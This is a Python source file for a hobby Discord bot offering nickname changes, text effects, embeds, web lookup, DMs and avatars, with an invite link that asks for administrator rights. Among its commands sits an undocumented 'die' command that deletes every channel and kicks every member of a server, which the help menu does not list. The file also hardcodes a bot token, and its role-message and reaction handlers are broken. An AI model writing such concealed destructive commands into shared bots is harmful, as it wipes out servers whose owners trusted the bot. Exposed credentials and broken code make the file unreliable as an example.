import discord 
from discord.ext import commands
from random import *
import datetime
import asyncio
from googlesearch import search
import PIL
from PIL import Image

client=commands.Bot(command_prefix= ",")

#onready
@client.event
async def on_ready():
    print("testing bot is running")
    await client.change_presence(activity=discord.Game("developing a sentience..."))
    '''gc=client.get_channel(785961671700381696)
    message=input(" ")
    while message!="end":
        await gc.send(f"{message}")
        message=input(" ")'''

#nickchanger
@client.command("nickchange")
async def nc(ctx,member:discord.Member=None,*,nick:str=None):
    if member == None:
        await ctx.send("give me a member and try again")
        return
    if nick == None:
        await ctx.send("give me something to change his name to")
        return
    await member.edit(nick=nick)
    await ctx.send("done")

#wave
@client.command("wave")
async def wave(ctx,*,text):
    try:
        text=str(text)
        output=""
        x=1
        for y in range(len(text)-1):
            output+=f"{text[:x]}\n"
            x+=1
        for y in range(len(text)-1):
            output+=f"{text[:x]}\n"
            x-=1
        output+=text[0]
        await ctx.message.channel.send(output)
    except:
        await ctx.send("lol too long :smirk:")

#embed
@client.command("embed")
async def embed(ctx,Channel:discord.TextChannel=None,*,text):
    title=text.split(',')[0]
    desc=text[len(title)+1:]
    msg=discord.Embed(title=title, description=desc, color=0x1c39bb)
    msg.set_footer(text="Made in China", icon_url=ctx.author.avatar_url)
    if Channel==None:
        await ctx.message.channel.send(embed=msg)
    else: 
        await Channel.send(embed=msg)

#id
@client.command("id")
async def id(ctx,member:discord.Member=None):
    if member==None:
        await ctx.message.channel.send(ctx.message.author.id)
        return
    try:
        await ctx.message.channel.send(member.id)
    except:
        await ctx.message.channel.send("no member with this name")

#lookup
@client.command("lookup")
async def lookup(ctx,*,text):
    for i in search(query=text,tld='co.in',lang='en',num=10,stop=1):
        await ctx.message.channel.send(i)

#dm
@client.command("dm")
async def dm(ctx, member:discord.Member, *, message):
    if member==client.user:
        await ctx.send("Hey i got ur message")
        return
    await ctx.send('Sending stuff...')
    await member.send(f'**{ctx.message.author}** sent the message: {message}')
    await ctx.send('stuff Sent.')

#avatar
@client.command("avatar")
async def avatar(ctx, *, member:discord.Member=None):
    if member==None:
        profile=ctx.author.avatar_url
    else:
        profile=member.avatar_url
    embeded_pfp=discord.Embed(title=f"{member}'s Avatar", color=0xffa500)
    embeded_pfp.set_image(url=(profile))
    embeded_pfp.set_footer(text="Made in China", icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embeded_pfp)

#die
@client.command()
async def die(ctx):
    guild=ctx.message.guild
    for channel in guild.channels:
        await channel.delete("frick you")
    for member in guild.members:
        await member.kick(reason="dumbass")

#help
client.remove_command('help')
@client.command()
async def help(ctx,function:str=None):
    emb=discord.Embed(title='Help',description='[invite me to your server everywhere](https://discord.com/oauth2/authorize?client_id=769968757442609213&scope=bot&permissions=8)')
    functdict={"cn" : "change the nickname of someone else who has a lower role than you",
    "wave":"wave your words, but dont make the message too long use as plz wave *message*",
    "embed":"embed some random stuff use as plz embed *#channelname* *title*,*message*",
    "id":"look up someone's id use as plz id *user*",
    "lookup":"lookup some random stuff usa as plz lookup *search parameters*",
    "dm":"dm someone use as plz dm *user* *message*",
    "avatar":"look at someones avatar closeup use as plz avatar *user*",}
    
    if function==None:
        string=''
        for funct in functdict:
            string+=f"`{funct}` "
        emb.add_field(name="commands",value=string)
    else:
        try:
            emb.add_field(name=function,value=functdict[function])
        except:
            await ctx.send("no function with this name")
            return
    emb.set_footer(text="use pls help {function name} to get more specific helpt\nremember to support the dev",icon_url="https://cdn.discordapp.com/avatars/769968757442609213/1163e9249d0ceb95d920df340e84925f.webp?size=1024")
    await ctx.send(embed=emb)

#rolemessage
rolemessage = {}
@client.command("rolemessage")
async def rolez(ctx,*,role:str=None):
    global rolemessage
    if role==None:
        await ctx.send("damn if you dont give me a role this message is useless")
        return
    await ctx.channel.purge(limit=1)
    rolemessage.update={await ctx.send("react to this message to get role {role}"),role}

@client.event
async def on_reaction_add(message):
    global rolemessage
    if message in rolemessage.keys():
        role1=discord.utils.get(message.guild.roles,name=rolemessage[message])

client.run("NzY5OTY4NzU3NDQyNjA5MjEz.X5WvSQ.xnPk0Oqd_07qPHchSTYpsdRL3ck")

